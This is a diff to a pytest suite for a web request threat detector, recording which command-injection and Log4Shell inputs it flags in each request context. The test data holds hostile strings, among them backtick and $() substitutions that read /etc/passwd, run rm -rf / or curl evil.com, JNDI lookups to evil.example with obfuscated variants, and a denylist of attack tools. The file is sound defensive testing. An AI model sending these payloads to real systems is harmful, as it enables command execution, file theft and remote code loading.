@@ -1,6 +1,9 @@
 import pytest
 
-from guard_core.sync.handlers.suspatterns_handler import sus_patterns_handler
+from guard_core.sync.handlers.suspatterns_handler import (
+    _LOG4SHELL_JNDI_LOOKUP_RE,
+    sus_patterns_handler,
+)
 
 BARE_BACKTICK_COMMAND_SUBSTITUTION_PAYLOADS = [
     pytest.param("`whoami`", id="bare_whoami"),
@@ -660,35 +663,544 @@ def test_sentence_boundary_backtick_mention_not_flagged_as_command_injection(
     assert result["is_threat"] is False
 
 
-GLUED_PREFIX_OR_SUFFIX_BACKTICK_PAYLOADS_KNOWN_UNDETECTED = [
-    pytest.param("x`id`", id="glued_prefix_single_char_id"),
-    pytest.param("a`whoami`", id="glued_prefix_single_char_whoami"),
-    pytest.param("1`id`", id="glued_prefix_digit_id"),
-    pytest.param("search`id`", id="glued_prefix_word_id"),
-    pytest.param("user`id`123", id="glued_prefix_and_suffix_id"),
-    pytest.param("file`id`.txt", id="glued_prefix_and_dotted_suffix_id"),
-    pytest.param("`id`x", id="glued_suffix_single_char_id"),
-    pytest.param("name=`id`&x=1", id="glued_query_string_context_id"),
-    pytest.param("q`whoami`q", id="glued_prefix_and_suffix_whoami"),
-    pytest.param("term`id`", id="glued_prefix_word_id_variant"),
-    pytest.param("value`reboot`value", id="glued_prefix_and_suffix_reboot"),
+GLUED_SHELL_COMMAND_BACKTICK_PAYLOADS = [
     pytest.param("abc`cat /etc/passwd`", id="glued_prefix_cat_passwd"),
-    pytest.param("img`whoami`.png", id="glued_prefix_and_dotted_suffix_whoami"),
     pytest.param("1;`id`x", id="glued_separator_prefix_and_suffix_id"),
-    pytest.param("foo`id`", id="glued_prefix_foo_id"),
-    pytest.param("`id`bar", id="glued_suffix_bar_id"),
-    pytest.param("search=test`whoami`", id="glued_query_value_prefix_whoami"),
     pytest.param("note`rm -rf /`note", id="glued_prefix_and_suffix_rm"),
+]
+
+GLUED_BARE_WORD_BACKTICK_PAYLOADS_AMBIGUOUS_BY_DESIGN = [
+    pytest.param("a`whoami`", id="glued_prefix_single_char_whoami"),
+    pytest.param("q`whoami`q", id="glued_prefix_and_suffix_whoami"),
+    pytest.param("img`whoami`.png", id="glued_prefix_and_dotted_suffix_whoami"),
+    pytest.param("search=test`whoami`", id="glued_query_value_prefix_whoami"),
 ]
 
 
 @pytest.mark.parametrize(
-    "payload", GLUED_PREFIX_OR_SUFFIX_BACKTICK_PAYLOADS_KNOWN_UNDETECTED
+    "payload", GLUED_BARE_WORD_BACKTICK_PAYLOADS_AMBIGUOUS_BY_DESIGN
 )
-def test_glued_prefix_or_suffix_backtick_payload_is_a_documented_known_gap(
+def test_glued_bare_word_backtick_payload_not_flagged_in_request_body(
     payload: str,
 ) -> None:
     result = sus_patterns_handler.detect(
         content=payload, ip_address="203.0.113.9", context="request_body"
     )
     assert result["is_threat"] is False
+
+
+@pytest.mark.parametrize(
+    "payload", GLUED_BARE_WORD_BACKTICK_PAYLOADS_AMBIGUOUS_BY_DESIGN
+)
+def test_glued_bare_word_backtick_payload_detected_in_query_param(
+    payload: str,
+) -> None:
+    result = sus_patterns_handler.detect(
+        content=payload, ip_address="203.0.113.9", context="query_param"
+    )
+    assert result["is_threat"] is True
+    assert any(
+        threat.get("category") == "cmd_injection" for threat in result["threats"]
+    )
+
+
+@pytest.mark.parametrize("payload", GLUED_SHELL_COMMAND_BACKTICK_PAYLOADS)
+def test_glued_shell_command_backtick_payload_is_detected_in_request_body(
+    payload: str,
+) -> None:
+    result = sus_patterns_handler.detect(
+        content=payload, ip_address="203.0.113.9", context="request_body"
+    )
+    assert result["is_threat"] is True
+    assert any(
+        threat.get("category") == "cmd_injection" for threat in result["threats"]
+    )
+
+
+@pytest.mark.parametrize("payload", GLUED_SHELL_COMMAND_BACKTICK_PAYLOADS)
+def test_glued_shell_command_backtick_payload_is_detected_in_query_param(
+    payload: str,
+) -> None:
+    result = sus_patterns_handler.detect(
+        content=payload, ip_address="203.0.113.9", context="query_param"
+    )
+    assert result["is_threat"] is True
+    assert any(
+        threat.get("category") == "cmd_injection" for threat in result["threats"]
+    )
+
+
+GLUED_AMBIGUOUS_TOKEN_BACKTICK_PAYLOADS = [
+    pytest.param("x`id`", id="glued_prefix_single_char_id"),
+    pytest.param("1`id`", id="glued_prefix_digit_id"),
+    pytest.param("search`id`", id="glued_prefix_word_id"),
+    pytest.param("user`id`123", id="glued_prefix_and_suffix_id"),
+    pytest.param("file`id`.txt", id="glued_prefix_and_dotted_suffix_id"),
+    pytest.param("`id`x", id="glued_suffix_single_char_id"),
+    pytest.param("`id`suffix", id="glued_suffix_word_suffix_id"),
+    pytest.param("term`id`", id="glued_prefix_word_id_variant"),
+    pytest.param("value`reboot`value", id="glued_prefix_and_suffix_reboot"),
+    pytest.param("foo`id`", id="glued_prefix_foo_id"),
+    pytest.param("`id`bar", id="glued_suffix_bar_id"),
+]
+
+
+@pytest.mark.parametrize("payload", GLUED_AMBIGUOUS_TOKEN_BACKTICK_PAYLOADS)
+def test_glued_ambiguous_token_backtick_payload_is_detected_in_query_param(
+    payload: str,
+) -> None:
+    result = sus_patterns_handler.detect(
+        content=payload, ip_address="203.0.113.9", context="query_param"
+    )
+    assert result["is_threat"] is True
+    assert any(
+        threat.get("category") == "cmd_injection" for threat in result["threats"]
+    )
+
+
+@pytest.mark.parametrize("payload", GLUED_AMBIGUOUS_TOKEN_BACKTICK_PAYLOADS)
+def test_glued_ambiguous_token_backtick_payload_is_detected_in_url_path(
+    payload: str,
+) -> None:
+    result = sus_patterns_handler.detect(
+        content=payload, ip_address="203.0.113.9", context="url_path"
+    )
+    assert result["is_threat"] is True
+    assert any(
+        threat.get("category") == "cmd_injection" for threat in result["threats"]
+    )
+
+
+AMBIGUOUS_TOKEN_BACKTICK_PAYLOADS_BENIGN_IN_REQUEST_BODY = [
+    pytest.param("search`id`", id="glued_prefix_word_id"),
+    pytest.param("`id`suffix", id="glued_suffix_word_suffix_id"),
+]
+
+
+@pytest.mark.parametrize(
+    "payload", AMBIGUOUS_TOKEN_BACKTICK_PAYLOADS_BENIGN_IN_REQUEST_BODY
+)
+def test_glued_ambiguous_token_backtick_payload_not_flagged_in_request_body(
+    payload: str,
+) -> None:
+    result = sus_patterns_handler.detect(
+        content=payload, ip_address="203.0.113.9", context="request_body"
+    )
+    assert result["is_threat"] is False
+
+
+KEBAB_IDENTIFIER_BACKTICK_PAYLOADS_BENIGN_IN_REQUEST_BODY = [
+    pytest.param("header`x-forwarded-for`value", id="kebab_header_x_forwarded_for"),
+    pytest.param("config`well-known`here", id="kebab_config_well_known"),
+    pytest.param("ref`user`list", id="plausible_ref_user_list"),
+]
+
+
+@pytest.mark.parametrize(
+    "payload", KEBAB_IDENTIFIER_BACKTICK_PAYLOADS_BENIGN_IN_REQUEST_BODY
+)
+def test_glued_kebab_identifier_backtick_payload_not_flagged_in_request_body(
+    payload: str,
+) -> None:
+    result = sus_patterns_handler.detect(
+        content=payload, ip_address="198.51.100.4", context="request_body"
+    )
+    assert result["is_threat"] is False
+
+
+def test_glued_kebab_identifier_backtick_payload_flagged_in_query_param() -> None:
+    result = sus_patterns_handler.detect(
+        content="header`x-forwarded-for`value",
+        ip_address="203.0.113.9",
+        context="query_param",
+    )
+    assert result["is_threat"] is True
+
+
+PUNCTUATION_GLUED_QUERY_STRING_BACKTICK_NOT_FLAGGED = [
+    pytest.param("name=`id`&x=1", id="query_string_equals_ampersand_glued_id"),
+    pytest.param(
+        "sort=`created_at`&order=asc", id="query_string_equals_ampersand_glued_sort"
+    ),
+    pytest.param("a=1&`b`=2", id="query_string_ampersand_equals_glued_b"),
+]
+
+
+@pytest.mark.parametrize("payload", PUNCTUATION_GLUED_QUERY_STRING_BACKTICK_NOT_FLAGGED)
+def test_punctuation_glued_query_string_backtick_not_flagged(
+    payload: str,
+) -> None:
+    result = sus_patterns_handler.detect(
+        content=payload, ip_address="198.51.100.4", context="request_body"
+    )
+    assert result["is_threat"] is False
+
+
+GLUED_BACKTICK_NON_ASCII_TOKEN_NOT_FLAGGED = [
+    pytest.param("x`café /etc/passwd`", id="glued_backtick_accented_word_and_path"),
+    pytest.param(
+        "x`file�name /etc/passwd`", id="glued_backtick_replacement_char_and_path"
+    ),
+    pytest.param("x`日本語 /etc/passwd`", id="glued_backtick_cjk_word_and_path"),
+]
+
+
+@pytest.mark.parametrize("payload", GLUED_BACKTICK_NON_ASCII_TOKEN_NOT_FLAGGED)
+def test_glued_backtick_non_printable_ascii_token_not_flagged(
+    payload: str,
+) -> None:
+    result = sus_patterns_handler.detect(
+        content=payload, ip_address="198.51.100.4", context="request_body"
+    )
+    assert not any(
+        threat.get("category") == "cmd_injection" for threat in result["threats"]
+    )
+
+
+UNAMBIGUOUS_DOLLAR_SUBSTITUTION_PAYLOADS = [
+    pytest.param("$(cat /etc/passwd)", id="dollar_paren_bare_cat_passwd"),
+    pytest.param("$(curl evil.com)", id="dollar_paren_bare_curl_evil_com"),
+    pytest.param("x$(curl evil.com)", id="dollar_paren_glued_prefix_curl_evil_com"),
+    pytest.param("${IFS}", id="dollar_brace_bare_ifs"),
+    pytest.param("$(nmap -sV target.example)", id="dollar_paren_bare_nmap"),
+    pytest.param("$(mkfifo /tmp/f)", id="dollar_paren_bare_mkfifo"),
+]
+
+BARE_DOLLAR_SUBSTITUTION_OR_GLUED_BACKTICK_AMBIGUOUS_BY_DESIGN = [
+    pytest.param("$(whoami)", id="dollar_paren_bare_whoami"),
+    pytest.param("foo$(whoami)bar", id="dollar_paren_glued_wrapped_whoami"),
+    pytest.param("${whoami}", id="dollar_brace_bare_whoami"),
+    pytest.param("x`nmap`", id="glued_backtick_denylist_nmap"),
+    pytest.param("x`socat`", id="glued_backtick_denylist_socat"),
+    pytest.param("x`msfconsole`", id="glued_backtick_denylist_msfconsole"),
+    pytest.param("x`msfvenom`", id="glued_backtick_denylist_msfvenom"),
+    pytest.param("x`certutil`", id="glued_backtick_denylist_certutil"),
+    pytest.param("x`bitsadmin`", id="glued_backtick_denylist_bitsadmin"),
+    pytest.param("x`powershell`", id="glued_backtick_denylist_powershell"),
+    pytest.param("x`pwsh`", id="glued_backtick_denylist_pwsh"),
+    pytest.param("x`mkfifo`", id="glued_backtick_denylist_mkfifo"),
+    pytest.param("x`aria2c`", id="glued_backtick_denylist_aria2c"),
+]
+
+
+@pytest.mark.parametrize(
+    "payload", BARE_DOLLAR_SUBSTITUTION_OR_GLUED_BACKTICK_AMBIGUOUS_BY_DESIGN
+)
+def test_bare_dollar_substitution_or_glued_backtick_not_flagged_in_body(
+    payload: str,
+) -> None:
+    result = sus_patterns_handler.detect(
+        content=payload, ip_address="203.0.113.9", context="request_body"
+    )
+    assert result["is_threat"] is False
+
+
+@pytest.mark.parametrize(
+    "payload", BARE_DOLLAR_SUBSTITUTION_OR_GLUED_BACKTICK_AMBIGUOUS_BY_DESIGN
+)
+def test_bare_dollar_substitution_or_glued_backtick_detected_in_query_param(
+    payload: str,
+) -> None:
+    result = sus_patterns_handler.detect(
+        content=payload, ip_address="203.0.113.9", context="query_param"
+    )
+    assert result["is_threat"] is True
+    assert any(
+        threat.get("category") == "cmd_injection" for threat in result["threats"]
+    )
+
+
+@pytest.mark.parametrize("payload", UNAMBIGUOUS_DOLLAR_SUBSTITUTION_PAYLOADS)
+def test_unambiguous_dollar_substitution_or_denylist_detected_in_body(
+    payload: str,
+) -> None:
+    result = sus_patterns_handler.detect(
+        content=payload, ip_address="203.0.113.9", context="request_body"
+    )
+    assert result["is_threat"] is True
+    assert any(
+        threat.get("category") == "cmd_injection" for threat in result["threats"]
+    )
+
+
+BARE_SHELL_COMMAND_DOLLAR_SUBSTITUTION_PROBES = [
+    pytest.param("$(id)", id="dollar_paren_bare_id"),
+    pytest.param("$(pwd)", id="dollar_paren_bare_pwd"),
+    pytest.param("$(whoami)", id="dollar_paren_bare_whoami"),
+    pytest.param("$(uptime)", id="dollar_paren_bare_uptime"),
+    pytest.param("$(w)", id="dollar_paren_bare_w"),
+    pytest.param("$(who)", id="dollar_paren_bare_who"),
+    pytest.param("$(groups)", id="dollar_paren_bare_groups"),
+    pytest.param("$(set)", id="dollar_paren_bare_set"),
+    pytest.param("${IFS}", id="dollar_brace_bare_ifs"),
+]
+
+
+@pytest.mark.parametrize("payload", BARE_SHELL_COMMAND_DOLLAR_SUBSTITUTION_PROBES)
+@pytest.mark.parametrize("context", ["query_param", "url_path"])
+def test_bare_shell_command_dollar_substitution_detected(
+    payload: str, context: str
+) -> None:
+    result = sus_patterns_handler.detect(
+        content=payload, ip_address="203.0.113.9", context=context
+    )
+    assert result["is_threat"] is True
+    assert any(
+        threat.get("category") == "cmd_injection" for threat in result["threats"]
+    )
+
+
+GLUED_AMBIGUOUS_TOKEN_DOLLAR_SUBSTITUTION_PAYLOADS = [
+    pytest.param("$(id)", id="dollar_paren_bare_id"),
+    pytest.param("${name}", id="dollar_brace_bare_name"),
+    pytest.param("search$(id)", id="dollar_paren_glued_prefix_search_id"),
+    pytest.param("${count}", id="dollar_brace_bare_count"),
+]
+
+
+@pytest.mark.parametrize("payload", GLUED_AMBIGUOUS_TOKEN_DOLLAR_SUBSTITUTION_PAYLOADS)
+def test_ambiguous_dollar_substitution_payload_is_detected_in_query_param(
+    payload: str,
+) -> None:
+    result = sus_patterns_handler.detect(
+        content=payload, ip_address="203.0.113.9", context="query_param"
+    )
+    assert result["is_threat"] is True
+    assert any(
+        threat.get("category") == "cmd_injection" for threat in result["threats"]
+    )
+
+
+@pytest.mark.parametrize("payload", GLUED_AMBIGUOUS_TOKEN_DOLLAR_SUBSTITUTION_PAYLOADS)
+def test_ambiguous_dollar_substitution_payload_is_detected_in_url_path(
+    payload: str,
+) -> None:
+    result = sus_patterns_handler.detect(
+        content=payload, ip_address="203.0.113.9", context="url_path"
+    )
+    assert result["is_threat"] is True
+    assert any(
+        threat.get("category") == "cmd_injection" for threat in result["threats"]
+    )
+
+
+JQUERY_AND_JS_TEMPLATE_DOLLAR_SUBSTITUTION_BENIGN_IN_REQUEST_BODY = [
+    pytest.param("$(id).addClass('active');", id="jquery_selector_bare_id_call"),
+    pytest.param(
+        "$('#submit-button').on('click', handleSubmit);",
+        id="jquery_selector_hash_id_call",
+    ),
+    pytest.param("const label = `Welcome ${obj.prop}`;", id="js_template_dotted_prop"),
+    pytest.param("const path = `/users/${id}`;", id="js_template_bare_var_brace"),
+    pytest.param(
+        "const greeting = `Hi ${name}, you have ${count} items`;",
+        id="js_template_multiple_bare_vars",
+    ),
+]
+
+
+@pytest.mark.parametrize(
+    "payload", JQUERY_AND_JS_TEMPLATE_DOLLAR_SUBSTITUTION_BENIGN_IN_REQUEST_BODY
+)
+def test_jquery_and_js_template_dollar_substitution_not_flagged_in_request_body(
+    payload: str,
+) -> None:
+    result = sus_patterns_handler.detect(
+        content=payload, ip_address="198.51.100.4", context="request_body"
+    )
+    assert result["is_threat"] is False
+
+
+LOG4SHELL_JNDI_PAYLOADS = [
+    pytest.param("${jndi:ldap://evil.example/a}", id="log4shell_direct_ldap"),
+    pytest.param("${jndi:rmi://evil.example/a}", id="log4shell_direct_rmi"),
+    pytest.param("${jndi:dns://evil.example/a}", id="log4shell_direct_dns"),
+    pytest.param("${lower:j}ndi", id="log4shell_obfuscated_lower_bare"),
+    pytest.param("${::-j}ndi", id="log4shell_obfuscated_default_value_bare"),
+    pytest.param(
+        "${${lower:j}ndi:ldap://evil.example/a}",
+        id="log4shell_obfuscated_nested_full_exploit",
+    ),
+]
+
+
+@pytest.mark.parametrize("payload", LOG4SHELL_JNDI_PAYLOADS)
+def test_log4shell_jndi_payload_is_detected_in_request_body(
+    payload: str,
+) -> None:
+    result = sus_patterns_handler.detect(
+        content=payload, ip_address="203.0.113.9", context="request_body"
+    )
+    assert result["is_threat"] is True
+    assert any(
+        threat.get("category") == "cmd_injection" for threat in result["threats"]
+    )
+
+
+@pytest.mark.parametrize("payload", LOG4SHELL_JNDI_PAYLOADS)
+def test_log4shell_jndi_payload_is_detected_in_query_param(
+    payload: str,
+) -> None:
+    result = sus_patterns_handler.detect(
+        content=payload, ip_address="203.0.113.9", context="query_param"
+    )
+    assert result["is_threat"] is True
+    assert any(
+        threat.get("category") == "cmd_injection" for threat in result["threats"]
+    )
+
+
+LOG4SHELL_JNDI_HEADER_PAYLOADS = [
+    pytest.param("${jndi:ldap://evil.example/a}", id="log4shell_direct_ldap"),
+    pytest.param("${lower:j}ndi", id="log4shell_obfuscated_lower_bare"),
+    pytest.param("${::-j}ndi", id="log4shell_obfuscated_default_value_bare"),
+]
+
+
+@pytest.mark.parametrize("payload", LOG4SHELL_JNDI_HEADER_PAYLOADS)
+def test_log4shell_jndi_payload_is_detected_in_header(
+    payload: str,
+) -> None:
+    result = sus_patterns_handler.detect(
+        content=payload, ip_address="203.0.113.9", context="header"
+    )
+    assert result["is_threat"] is True
+    assert any(
+        threat.get("category") == "cmd_injection" for threat in result["threats"]
+    )
+
+
+SQL_KEYWORD_GLUED_EXEMPTION_BYPASS_CASES = [
+    pytest.param("x`id` JOIN accounts", id="backtick_ambiguous_keyword_not_glued"),
+    pytest.param("x$(id) JOIN accounts", id="dollar_paren_ambiguous_keyword_not_glued"),
+]
+
+
+@pytest.mark.parametrize("payload", SQL_KEYWORD_GLUED_EXEMPTION_BYPASS_CASES)
+def test_sql_keyword_not_glued_no_longer_exempts_ambiguous_token_in_query_param(
+    payload: str,
+) -> None:
+    result = sus_patterns_handler.detect(
+        content=payload, ip_address="203.0.113.9", context="query_param"
+    )
+    assert result["is_threat"] is True
+    assert any(
+        threat.get("category") == "cmd_injection" for threat in result["threats"]
+    )
+
+
+SQL_KEYWORD_GLUED_EXEMPTION_STILL_APPLIES_CASES = [
+    pytest.param("SELECT`id`FROM users", id="backtick_keyword_glued_no_space"),
+    pytest.param("SELECT$(id)FROM users", id="dollar_paren_keyword_glued_no_space"),
+]
+
+
+@pytest.mark.parametrize("payload", SQL_KEYWORD_GLUED_EXEMPTION_STILL_APPLIES_CASES)
+def test_sql_keyword_glued_no_space_still_exempts_ambiguous_token_in_query_param(
+    payload: str,
+) -> None:
+    result = sus_patterns_handler.detect(
+        content=payload, ip_address="203.0.113.9", context="query_param"
+    )
+    assert result["is_threat"] is False
+
+
+LOG4SHELL_JNDI_URL_PATH_PAYLOADS = [
+    pytest.param("${jndi:ldap://evil.example/a}", id="log4shell_direct_ldap"),
+    pytest.param("${lower:j}ndi", id="log4shell_obfuscated_lower_bare"),
+    pytest.param("${::-j}ndi", id="log4shell_obfuscated_default_value_bare"),
+    pytest.param(
+        "${${lower:j}ndi:ldap://evil.example/a}",
+        id="log4shell_obfuscated_nested_full_exploit",
+    ),
+]
+
+
+@pytest.mark.parametrize("payload", LOG4SHELL_JNDI_URL_PATH_PAYLOADS)
+def test_log4shell_jndi_payload_matched_by_dedicated_pattern_in_url_path(
+    payload: str,
+) -> None:
+    result = sus_patterns_handler.detect(
+        content=payload, ip_address="203.0.113.9", context="url_path"
+    )
+    assert result["is_threat"] is True
+    assert any(
+        threat.get("pattern") == _LOG4SHELL_JNDI_LOOKUP_RE
+        for threat in result["threats"]
+    )
+
+
+_BACKTICK_WINDOW_OFFSETS = [39, 40, 41, 200, 4096]
+
+
+def _glued_backtick_padded_shell_metacharacter(offset: int) -> str:
+    return "`custom_col`" + "A" * offset + "; echo"
+
+
+def _glued_backtick_padded_no_metacharacter(offset: int) -> str:
+    return "`custom_col`" + "A" * offset
+
+
+@pytest.mark.parametrize(
+    "offset",
+    _BACKTICK_WINDOW_OFFSETS,
+    ids=[f"offset_{o}" for o in _BACKTICK_WINDOW_OFFSETS],
+)
+def test_glued_backtick_far_shell_metacharacter_detected_in_request_body(
+    offset: int,
+) -> None:
+    result = sus_patterns_handler.detect(
+        content=_glued_backtick_padded_shell_metacharacter(offset),
+        ip_address="203.0.113.9",
+        context="request_body",
+    )
+    assert result["is_threat"] is True
+    assert any(
+        threat.get("category") == "cmd_injection" for threat in result["threats"]
+    )
+
+
+@pytest.mark.parametrize(
+    "offset",
+    _BACKTICK_WINDOW_OFFSETS,
+    ids=[f"offset_{o}" for o in _BACKTICK_WINDOW_OFFSETS],
+)
+def test_glued_backtick_padding_with_no_metacharacter_not_flagged(
+    offset: int,
+) -> None:
+    result = sus_patterns_handler.detect(
+        content=_glued_backtick_padded_no_metacharacter(offset),
+        ip_address="198.51.100.4",
+        context="request_body",
+    )
+    assert result["is_threat"] is False
+
+
+def test_glued_backtick_far_metacharacter_bounded_by_intervening_quote() -> None:
+    payload = "`custom_col`" + "'" + "A" * 200 + "; echo"
+    result = sus_patterns_handler.detect(
+        content=payload, ip_address="198.51.100.4", context="request_body"
+    )
+    assert result["is_threat"] is False
+
+
+@pytest.mark.parametrize(
+    "offset",
+    _BACKTICK_WINDOW_OFFSETS,
+    ids=[f"offset_{o}" for o in _BACKTICK_WINDOW_OFFSETS],
+)
+def test_backtick_window_reaches_the_full_gap_when_no_delimiter_present(
+    offset: int,
+) -> None:
+    import re
+
+    from guard_core.sync.handlers.suspatterns_handler import (
+        _GLUED_BACKTICK_CANDIDATE_RE,
+        _backtick_pair_context_window,
+    )
+
+    content = _glued_backtick_padded_no_metacharacter(offset)
+    match = re.search(_GLUED_BACKTICK_CANDIDATE_RE, content)
+    assert match is not None
+    window = _backtick_pair_context_window(content, match.start(), match.end())
+    assert window == content
